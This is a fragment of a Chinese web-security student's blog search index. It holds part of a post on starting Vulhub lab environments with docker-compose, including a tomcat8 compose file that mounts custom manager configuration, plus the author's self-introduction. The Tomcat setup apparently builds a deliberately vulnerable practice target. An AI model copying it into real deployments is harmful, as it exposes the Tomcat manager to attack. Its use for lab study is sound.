title="vulhub一键搭漏洞环境"></a>vulhub一键搭漏洞环境</h4><pre class="line-numbers language-shell"><code class="language-shell">#首先进入对应漏洞环境的文件夹Docker-compose up -d  #根据docker-compose.yml自动拉取容器并启动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>tomcat8的docker-compose.yml:</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span> <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>   <span class="token key atrule">image</span><span class="token punctuation">:</span> vulhub/tomcat<span class="token punctuation">:</span><span class="token number">8.0</span>   <span class="token key atrule">volumes</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> ./tomcat<span class="token punctuation">-</span>users.xml<span class="token punctuation">:</span>/usr/local/tomcat/conf/tomcat<span class="token punctuation">-</span>users.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/manager/META<span class="token punctuation">-</span>INF/context.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/host<span class="token punctuation">-</span>manager/META<span class="token punctuation">-</span>INF/context.xml   <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自我介绍</title>
      <link href="/2021/10/31/zi-wo-jie-shao/"/>
      <url>/2021/10/31/zi-wo-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>我是Squirt1e，坐标北京，是一名即将步入研究生阶段的web🐕。</p><p>我的梦想是成为安全研究员，并且做出一些有用的工作，但这个梦想可能难以实现。一个原因是研究生阶段的方向可能与web安全研究出入比较大，我早就知道研究生不太可能做“传统”网安。但从导师那里得知自己和“传统”网安无缘，是有一点点失望。另一个原因是我比较菜，各位师傅看我的文章就知道我的水平并不高，同年龄段大师傅的仓库里0day满天飞，而我还在思考CMS的代码为什么这么写。菜的原因（我不承认我脑袋不行:&gt;）大概是因为大一我在摆烂，而大二大三在卷一些实际用处不大的东西。</p><p>尽管如此，我还是想尝试坚持一下，毕竟web安全是我目前唯一感兴趣的点。这个博客算是用来督促我学习web的，争取每周发一篇认真去思考打磨的文章。等我认为博客质量过关了，我才会去发安全研究分类的文章。</p><p>联系方式：<a href="mailto:&#x31;&#x33;&#x30;&#51;&#x35;&#x31;&#x36;&#50;&#x30;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;">&#x31;&#x33;&#x30;&#51;&#x35;&#x31;&#x36;&#50;&#x30;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 关于Squirt1e </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
